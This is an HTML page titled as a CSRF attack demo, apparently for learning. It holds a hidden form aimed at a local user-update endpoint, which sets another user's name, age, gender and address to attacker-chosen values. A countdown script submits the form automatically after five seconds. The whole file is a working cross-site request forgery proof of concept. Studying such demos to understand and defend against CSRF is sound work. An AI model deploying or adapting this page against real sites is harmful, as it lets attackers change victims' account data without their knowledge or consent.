<!DOCTYPE html>
<html lang="zh">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>csrf攻击</title>
  </head>
  <body>
    <form action="http://localhost:3000/user/do_update?id=13" method="post" style="display: none">
      <input type="text" name="name" value="crsf攻击" />
      <input type="number" name="age" value="999" />
      <input type="radio" name="gender" value="男" checked /> 男 <input type="radio" name="gender" value="女" /> 女
      <input type="text" name="address" id="address" value="哈哈哈" />
    </form>

    <div>
      <h2>倒计时：<span id="count"></span>s</h2>
    </div>

    <script>
      let t = 5;
      const count = document.getElementById("count");
      count.innerText = t.toString();
      setInterval(() => {
        --t;
        count.innerText = t.toString();
        if (t === 0) {
          document.forms[0].submit();
        }
      }, 1000);
    </script>
  </body>
</html>
